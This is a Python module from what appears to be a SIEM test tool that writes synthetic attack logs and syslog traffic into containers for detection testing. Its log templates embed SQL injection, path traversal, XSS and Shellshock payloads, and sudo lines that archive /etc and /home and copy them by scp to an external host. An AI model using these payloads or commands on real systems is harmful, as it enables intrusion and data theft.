"""
Simulation execution — attack profiles, custom EPS log streams and syslog forwarding.
"""
import asyncio
import json
import logging
import random
import re
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

from fastapi.encoders import jsonable_encoder

from app.core.lxc_backend import lxc
from app.core.shell import execute_in_container, execute_in_container_shell
from app.models import AgentSelector, CustomLogSimulationRequest, SyslogSimulationRequest, utc_now
from app.services.activity import log_activity
from app.services.agent_info import read_agent_metadata
from app.services.logs import escape_bash_single_quotes, escape_json_string
from app.state import simulations_db

logger = logging.getLogger(__name__)

SIMULATION_WORKERS = 16  # containers written to at once per second


def _build_custom_log_script(config: CustomLogSimulationRequest, simulation_id: str) -> str:
    extra_fields = jsonable_encoder(config.extra_fields or {})
    extra_fragment = ""
    if extra_fields:
        extra_json = json.dumps(extra_fields)
        if extra_json and extra_json != "{}":
            extra_fragment = f",{extra_json[1:-1]}"

    message_escaped = escape_json_string(config.message)
    script = f"""
FILE_PATH='{escape_bash_single_quotes(config.file_path)}'
MESSAGE_ESCAPED='{escape_bash_single_quotes(message_escaped)}'
SRC_IP='{escape_bash_single_quotes(config.src_ip)}'
DEST_IP='{escape_bash_single_quotes(config.dest_ip)}'
EXTRA_FRAGMENT='{escape_bash_single_quotes(extra_fragment)}'
SIM_ID='{escape_bash_single_quotes(simulation_id)}'
START_TIME='{escape_bash_single_quotes(config.start_time.isoformat() if config.start_time else "")}'
EPS={config.eps}
DURATION={config.duration}
SEQ_START={config.seq_start}
TOTAL=$((EPS * DURATION))

mkdir -p "$(dirname "$FILE_PATH")"

if [ -n "$START_TIME" ]; then
  START_EPOCH=$(date -u -d "$START_TIME" +%s 2>/dev/null || date +%s)
else
  START_EPOCH=$(date +%s)
fi

SEQ=$((SEQ_START - 1))
COUNT=0

for s in $(seq 1 "$DURATION"); do
  TS=$(date -u -d "@$((START_EPOCH + s - 1))" +%Y-%m-%dT%H:%M:%SZ)
  for i in $(seq 1 "$EPS"); do
    COUNT=$((COUNT + 1))
    SEQ=$((SEQ + 1))
    printf '{{"timestamp":"%s","date":"%s","eps":%s,"duration_seconds":%s,"src_ip":"%s","dest_ip":"%s","file_path":"%s","message":"%s","count":%s,"seq":%s,"simulation_id":"%s","total_count":%s%s}}\\n' \\
      "$TS" "$TS" "$EPS" "$DURATION" "$SRC_IP" "$DEST_IP" "$FILE_PATH" "$MESSAGE_ESCAPED" "$COUNT" "$SEQ" "$SIM_ID" "$TOTAL" "$EXTRA_FRAGMENT" >> "$FILE_PATH"
  done
  sleep 1
done

echo "Generated $COUNT custom events"
"""
    return script


def select_agents_for_simulation(selector: AgentSelector, user: dict | None = None) -> list[str]:
    """The running containers matching every criterion given (agent_ids, siem_type,
    agent_group, status), then a random `count` of them if set."""
    wanted_ids = set(selector.agent_ids or [])
    siem_type = getattr(selector.siem_type, "value", selector.siem_type)
    status = getattr(selector.status, "value", selector.status)
    selected = []
    from app.services.tenancy import visible
    for name in visible(user, lxc.list_containers()):
        if wanted_ids and name not in wanted_ids:
            continue
        if not lxc.Container(name).running:
            continue  # only running containers can generate events
        if status and status != "running":
            continue
        if siem_type or selector.agent_group:
            meta = read_agent_metadata(name)
            if siem_type and meta.get("siem_type") != siem_type:
                continue
            if selector.agent_group and meta.get("agent_group") != selector.agent_group:
                continue
        selected.append(name)

    if selector.count:
        selected = random.sample(selected, min(selector.count, len(selected)))
    return selected


def announce_finished(simulation_id: str) -> None:
    """Metrics and the simulation.finished notification, from the simulation's final record."""
    from app.services import notify, telemetry
    sim = simulations_db.get(simulation_id) or {}
    status = sim.get("status", "unknown")
    if status == "running":
        return
    try:
        telemetry.SIMULATIONS.inc(status=status)
        kind = sim.get("type") or sim.get("profile_id") or "simulation"
        notify.emit(
            "simulation.finished",
            f"Simulation {status}: {kind}",
            sim.get("error") or "",
            level={"completed": "success", "stopped": "info", "interrupted": "warning"}.get(status, "error"),
            fields={"simulation_id": simulation_id, "events": sim.get("events_generated", 0),
                    "containers": len(sim.get("agents") or sim.get("containers") or [])},
            link="/simulations",
        )
    except Exception:
        logger.exception("Announcing the simulation result failed")


async def run_simulation(simulation_id: str, profile_id: str, agents: list[str],
                        duration: int, eps_target: int):
    """Run an attack profile on the selected containers: every second, each container writes
    `eps_target` log lines (in parallel across containers), for `duration` seconds."""
    try:
        logger.info(f"Starting simulation {simulation_id} on {len(agents)} containers")
        attacker_ip = f"203.0.113.{random.randint(10, 250)}"  # one attacker per run, from a documentation range
        if simulation_id in simulations_db:
            simulations_db[simulation_id]["attacker_ip"] = attacker_ip

        end_time = time.time() + duration
        events_generated = 0
        failures = 0
        last_error = None

        def tick(agent: str) -> dict:
            return generate_simulation_events(agent, profile_id, eps_target, attacker_ip)

        with ThreadPoolExecutor(max_workers=min(SIMULATION_WORKERS, max(1, len(agents)))) as pool:
            while time.time() < end_time:
                if simulations_db.get(simulation_id, {}).get("status") != "running":
                    break  # stopped by a user, or interrupted by a restart
                started = time.monotonic()
                results = await asyncio.to_thread(lambda: list(pool.map(tick, agents)))
                for result in results:
                    events_generated += result.get("events", 0)
                    if not result.get("success"):
                        failures += 1
                        last_error = result.get("error") or last_error
                if simulation_id in simulations_db:
                    simulations_db[simulation_id]["events_generated"] = events_generated
                    simulations_db[simulation_id]["failed_writes"] = failures
                    if last_error:
                        simulations_db[simulation_id]["last_error"] = last_error
                await asyncio.sleep(max(0.0, 1.0 - (time.monotonic() - started)))

        if simulation_id in simulations_db:
            sim = simulations_db[simulation_id]
            if sim.get("status") == "running":
                # Nothing written at all means the profile couldn't run on these containers
                sim["status"] = "completed" if events_generated else "failed"
                if not events_generated:
                    sim["error"] = last_error or "No events were written"
            sim["completed_at"] = utc_now().isoformat()
            sim["events_generated"] = events_generated

        log_activity("simulation_completed", {
            "simulation_id": simulation_id,
            "events_generated": events_generated,
            "failed_writes": failures,
        }, status="success" if events_generated and not failures else ("partial" if events_generated else "error"))

        logger.info(f"Simulation {simulation_id} completed with {events_generated} events")

    except Exception as e:
        logger.error(f"Simulation {simulation_id} failed: {e}")
        if simulation_id in simulations_db:
            simulations_db[simulation_id]["status"] = "failed"
            simulations_db[simulation_id]["error"] = str(e)
    announce_finished(simulation_id)


async def run_custom_log_simulation(
    simulation_id: str,
    containers: list[str],
    config: CustomLogSimulationRequest
) -> None:
    try:
        timeout = config.duration + 60
        tasks = []
        for container_name in containers:
            script = _build_custom_log_script(config, simulation_id)
            tasks.append(asyncio.to_thread(
                execute_in_container_shell,
                container_name,
                script,
                None,
                timeout
            ))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        errors = []
        success_count = 0
        for container_name, result in zip(containers, results, strict=True):
            if isinstance(result, Exception):
                errors.append({"container": container_name, "error": str(result)})
                continue
            if not result.get("success"):
                errors.append({"container": container_name, "error": result.get("stderr")})
                continue
            success_count += 1

        total_events = config.eps * config.duration * success_count

        if simulation_id in simulations_db:
            simulations_db[simulation_id]["events_generated"] = total_events
            simulations_db[simulation_id]["completed_at"] = utc_now().isoformat()
            simulations_db[simulation_id]["status"] = "completed" if success_count == len(containers) else "failed"
            if errors:
                simulations_db[simulation_id]["errors"] = errors

        log_activity("custom_log_simulation_completed", {
            "simulation_id": simulation_id,
            "successful_containers": success_count,
            "failed_containers": len(containers) - success_count,
            "events_generated": total_events
        })
    except Exception as e:
        logger.error(f"Custom log simulation {simulation_id} failed: {e}")
        if simulation_id in simulations_db:
            simulations_db[simulation_id]["status"] = "failed"
            simulations_db[simulation_id]["error"] = str(e)
        log_activity("custom_log_simulation_failed", {"simulation_id": simulation_id, "error": str(e)}, status="error")
    announce_finished(simulation_id)


SYSLOG_TEMPLATES = {
    "router": [
        "%LINK-5-CHANGED: Interface GigabitEthernet0/{iface} changed state to administratively down",
        "%LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/{iface}, changed state to down",
        "%SYS-5-CONFIG_I: Configured from console by admin on vty0 ({device_ip})",
        "%OSPF-5-ADJCHG: Process 1, Nbr {peer_ip} on GigabitEthernet0/{iface} from FULL to DOWN, Neighbor Down: Dead timer expired",
        "%SEC_LOGIN-5-LOGIN_SUCCESS: Login successful [user: admin] [Source: {src_ip}] [localport: 22] at {timestamp}"
    ],
    "switch": [
        "%LINK-3-UPDOWN: Interface FastEthernet0/{iface}, changed state to up",
        "%SPANTREE-6-PORTBLK: Port Fa0/{iface} blocked by spanning tree.",
        "%MACFLAP_NOTIF: Host {mac} in vlan {vlan} is flapping between port Fa0/{iface} and port Fa0/{iface_alt}",
        "%DHCP_SNOOPING-5-DHCP_SNOOPING_NONZERO_GIADDR: DHCP_SNOOPING drop message with non-zero giaddr from interface Fa0/{iface}",
        "%AUTHPRIV-6-SYSTEM_MSG: AAA authorization succeeded for user admin - shell"
    ],
    "firewall": [
        "%ASA-6-302013: Built inbound TCP connection {conn} for inside:{src_ip}/{src_port} ({src_ip}/{src_port}) to outside:{dst_ip}/80",
        "%ASA-6-302014: Teardown TCP connection {conn} for inside:{src_ip}/{src_port} to outside:{dst_ip}/80 duration 0:{min}:{sec} bytes {bytes}",
        "%ASA-4-106023: Deny tcp src outside:{dst_ip}/{dst_port} dst inside:{src_ip}/22 by access-group \"OUTSIDE_IN\" [0x0, 0x0]",
        "%ASA-5-111008: User 'admin' executed the 'enable' command.",
        "%ASA-6-305011: Built dynamic UDP translation from inside:{src_ip}/{src_port} to outside:{dst_ip}/{dst_port}"
    ],
    "ids": [
        "%ET NETBIOS DCERPC ISystemActivator SMB named pipe access attempt {sig}",
        "%ET TROJAN Possible Metasploit Payload common.ports.dstport {sig}",
        "%GPL ATTACK_RESPONSE id check returned root {sig}",
        "%ET SCAN Potential SSH Scan {sig}",
        "%ET WEB_CLIENT Microsoft Internet Explorer invalid MIME type attempt {sig}"
    ]
}


def _select_syslog_template(device_type: str) -> str:
    return random.choice(SYSLOG_TEMPLATES.get(device_type, SYSLOG_TEMPLATES["router"]))


def _build_syslog_message(device_name: str, device_ip: str, device_type: str, facility: int) -> str:
    timestamp = datetime.now().strftime("%b %d %H:%M:%S")
    severity = random.choices(
        [0, 1, 2, 3, 4, 5, 6, 7],
        weights=[0.1, 0.5, 1, 2, 5, 10, 70, 11.4]
    )[0]
    pri = f"<{facility * 8 + severity}>"
    template = _select_syslog_template(device_type)
    payload = template.format(
        iface=random.randint(1, 24),
        iface_alt=random.randint(1, 24),
        device_ip=device_ip,
        peer_ip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        src_ip=f"{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(10,250)}",
        dst_ip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
        src_port=random.randint(1024, 65535),
        dst_port=random.randint(1024, 65535),
        conn=random.randint(1000, 9999),
        min=random.randint(0, 59),
        sec=random.randint(0, 59),
        bytes=random.randint(100, 99999),
        vlan=random.randint(1, 100),
        mac=":".join(f"{random.randint(0,255):02x}" for _ in range(6)),
        sig=random.randint(1000, 9999),
        timestamp=timestamp
    )
    header = f"{timestamp} {device_name}"
    return f"{pri}{header}: {payload}"


def _send_syslog_message(target_ip: str, target_port: int, protocol: str, message: str) -> bool:
    try:
        if protocol == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            sock.sendall(message.encode("utf-8") + b"\n")
            sock.close()
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message.encode("utf-8"), (target_ip, target_port))
            sock.close()
        return True
    except Exception:
        return False


def run_syslog_simulation(simulation_id: str, request: SyslogSimulationRequest) -> None:
    try:
        device_types = ["router", "switch", "firewall", "ids"]
        device_type_value = request.device_type.value if hasattr(request.device_type, "value") else request.device_type
        if device_type_value != "mixed":
            device_types = [device_type_value]

        devices = []
        for idx in range(request.device_count):
            device_type = device_types[idx % len(device_types)]
            device_name = f"{request.device_name_prefix}-{idx + 1:02d}"
            device_ip = f"10.0.{(idx % 254) + 1}.{(idx % 250) + 1}"
            devices.append((device_name, device_ip, device_type))

        total_sent = 0
        total_failed = 0
        protocol = request.protocol.value if hasattr(request.protocol, "value") else request.protocol
        per_device_base = request.eps // request.device_count
        remainder = request.eps % request.device_count

        for _second in range(request.duration):
            status = simulations_db.get(simulation_id, {}).get("status")
            if status != "running":
                break
            for index, (device_name, device_ip, device_type) in enumerate(devices):
                count = per_device_base + (1 if index < remainder else 0)
                for _ in range(count):
                    message = _build_syslog_message(device_name, device_ip, device_type, request.facility)
                    if _send_syslog_message(request.target_ip, request.target_port, protocol, message):
                        total_sent += 1
                    else:
                        total_failed += 1
            time.sleep(1)

        simulation = simulations_db.get(simulation_id)
        if simulation:
            simulation["events_generated"] = total_sent
            simulation["completed_at"] = utc_now().isoformat()
            if simulation.get("status") == "running":
                simulation["status"] = "completed" if total_sent > 0 else "failed"
            simulation["messages_failed"] = total_failed

        log_activity("syslog_simulation_completed", {
            "simulation_id": simulation_id,
            "messages_sent": total_sent,
            "messages_failed": total_failed
        })
    except Exception as e:
        logger.error(f"Syslog simulation {simulation_id} failed: {e}")
        if simulation_id in simulations_db:
            simulations_db[simulation_id]["status"] = "failed"
            simulations_db[simulation_id]["error"] = str(e)
        log_activity("syslog_simulation_failed", {"simulation_id": simulation_id, "error": str(e)}, status="error")
    announce_finished(simulation_id)


def generate_simulation_events(agent_name: str, profile_id: str, eps_target: int,
                               attacker_ip: str = "203.0.113.50") -> dict:
    """Write one second's worth (`eps_target` lines) of a profile's events in a container.
    Returns the number of lines actually written."""
    script = build_attack_script(profile_id, eps_target, attacker_ip)
    result = execute_in_container(agent_name, script, timeout=10)
    match = re.search(r"EVENTS_WRITTEN=(\d+)", result.get("stdout") or "")
    events = int(match.group(1)) if match and result.get("success") else 0
    error = None if events else ((result.get("stderr") or result.get("stdout") or "no output").strip()[-300:])
    return {"success": bool(events), "events": events, "error": error}


# ── attack profiles ─────────────────────────────────────────────────────
#
# Each profile writes log lines in the formats the SIEM agents parse out of the box:
# syslog lines ("Sep 24 20:15:01 host sshd[123]: ...") in /var/log/auth.log and
# /var/log/syslog, and Apache's combined format in /var/log/apache2/access.log.
# External addresses come from the documentation ranges (RFC 5737), so no real host is
# implicated. Lines vary (users, ports, PIDs, requests) so they look like real traffic.

PROFILES = {
    "auth_bruteforce": "SSH password guessing from one external address against many user names",
    "web_attacks": "SQL injection, path traversal, XSS, Shellshock and scanner requests to a web server",
    "malware_beacon": "Repeated outbound connections to a command-and-control address, blocked by the firewall",
    "lateral_movement": "One service account signing in over SSH from many internal hosts",
    "data_exfiltration": "Archiving sensitive directories with sudo and copying them to an external host",
    "privilege_escalation": "A web server account trying sudo and su to become root",
}

_PREAMBLE = r"""set -e
H=$(hostname)
IP=$(hostname -I 2>/dev/null | awk '{print $1}')
IP=${IP:-10.0.3.10}
A='%(attacker)s'
N=%(count)d
TS=$(date '+%%b %%e %%H:%%M:%%S')
AUTH='%(root)s/var/log/auth.log'
SYSLOG='%(root)s/var/log/syslog'
WEB='%(root)s/var/log/apache2/access.log'
mkdir -p "$(dirname "$AUTH")" "$(dirname "$WEB")"
"""

_BODIES = {
    "auth_bruteforce": r"""USERS=(admin root test oracle ubuntu postgres git deploy)
{ for i in $(seq 1 "$N"); do
  printf '%s %s sshd[%d]: Failed password for invalid user %s from %s port %d ssh2
'     "$TS" "$H" $((RANDOM % 60000 + 1000)) "${USERS[$((RANDOM % 8))]}" "$A" $((RANDOM % 30000 + 30000))
done; } >> "$AUTH"
""",
    "web_attacks": r"""WT=$(date '+%d/%b/%Y:%H:%M:%S %z')
REQS=("GET /index.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1"
      "GET /../../../../etc/passwd HTTP/1.1"
      "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1"
      "GET /cgi-bin/status HTTP/1.1"
      "GET /wp-login.php HTTP/1.1"
      "POST /login.php?user=admin%27-- HTTP/1.1")
CODES=(200 400 200 500 404 302)
AGENTS=("sqlmap/1.8" "Mozilla/5.0" "Mozilla/5.0" "() { :; }; /bin/bash -c id" "Mozilla/5.00 (Nikto/2.5.0)" "sqlmap/1.8")
{ for i in $(seq 1 "$N"); do
  k=$((RANDOM % 6))
  printf '%s - - [%s] "%s" %s %d "-" "%s"
' "$A" "$WT" "${REQS[$k]}" "${CODES[$k]}" $((RANDOM % 4000 + 200)) "${AGENTS[$k]}"
done; } >> "$WEB"
""",
    "malware_beacon": r"""C2=198.51.100.66
{ for i in $(seq 1 "$N"); do
  printf '%s %s kernel: [%d.%06d] [UFW BLOCK] IN= OUT=eth0 SRC=%s DST=%s LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=%d DF PROTO=TCP SPT=%d DPT=443 WINDOW=64240 RES=0x00 SYN URGP=0
'     "$TS" "$H" $((RANDOM % 90000 + 1000)) $((RANDOM * 30)) "$IP" "$C2" $((RANDOM % 65000)) $((RANDOM % 30000 + 30000))
done; } >> "$SYSLOG"
""",
    "lateral_movement": r"""{ for i in $(seq 1 "$N"); do
  SRC="10.$((RANDOM % 4 + 10)).$((RANDOM % 250 + 1)).$((RANDOM % 250 + 2))"
  PID=$((RANDOM % 60000 + 1000))
  if [ $((i % 2)) -eq 1 ]; then
    printf '%s %s sshd[%d]: Accepted password for svc_backup from %s port %d ssh2
' "$TS" "$H" "$PID" "$SRC" $((RANDOM % 30000 + 30000))
  else
    printf '%s %s sshd[%d]: pam_unix(sshd:session): session opened for user svc_backup(uid=1002) by (uid=0)
' "$TS" "$H" "$PID"
  fi
done; } >> "$AUTH"
""",
    "data_exfiltration": r"""DEST=198.51.100.23
HALF=$(( (N + 1) / 2 ))
{ for i in $(seq 1 "$HALF"); do
  if [ $((i % 2)) -eq 1 ]; then
    printf '%s %s sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.cache-%d.tgz /etc /home /var/backups
' "$TS" "$H" "$i"
  else
    printf '%s %s sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/scp /tmp/.cache-%d.tgz ops@%s:/upload/
' "$TS" "$H" "$((i - 1))" "$DEST"
  fi
done; } >> "$AUTH"
{ for i in $(seq 1 $((N - HALF))); do
  printf '%s %s kernel: [%d.%06d] [UFW ALLOW] IN= OUT=eth0 SRC=%s DST=%s LEN=1500 TOS=0x00 PREC=0x00 TTL=64 ID=%d DF PROTO=TCP SPT=%d DPT=22 WINDOW=501 RES=0x00 ACK PSH URGP=0
'     "$TS" "$H" $((RANDOM % 90000 + 1000)) $((RANDOM * 30)) "$IP" "$DEST" $((RANDOM % 65000)) $((RANDOM % 30000 + 30000))
done; } >> "$SYSLOG"
""",
    "privilege_escalation": r"""{ for i in $(seq 1 "$N"); do
  case $((i % 3)) in
    1) printf '%s %s sudo: pam_unix(sudo:auth): authentication failure; logname=www-data uid=33 euid=0 tty=/dev/pts/1 ruser=www-data rhost=  user=www-data
' "$TS" "$H" ;;
    2) printf '%s %s sudo: www-data : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
' "$TS" "$H" ;;
    0) printf '%s %s su[%d]: FAILED SU (to root) www-data on pts/1
' "$TS" "$H" $((RANDOM % 60000 + 1000)) ;;
  esac
done; } >> "$AUTH"
""",
}


def list_simulation_profiles() -> list[str]:
    """The attack profiles that can be run."""
    return list(PROFILES)


def build_attack_script(profile_id: str, count: int, attacker_ip: str, log_root: str = "") -> str:
    """The bash script that appends `count` lines of a profile's events and prints
    EVENTS_WRITTEN=<count>. `log_root` prefixes the log paths (tests)."""
    if profile_id not in _BODIES:
        raise ValueError(f"Unknown attack profile: {profile_id}")
    if not re.fullmatch(r"[0-9.]+", attacker_ip):
        raise ValueError("attacker_ip must be an IPv4 address")
    if log_root and not re.fullmatch(r"[\w./-]+", log_root):
        raise ValueError("log_root must be a plain path")
    count = max(1, int(count))
    return (_PREAMBLE % {"attacker": attacker_ip, "count": count, "root": log_root}
            + _BODIES[profile_id] + 'echo "EVENTS_WRITTEN=$N"\n')
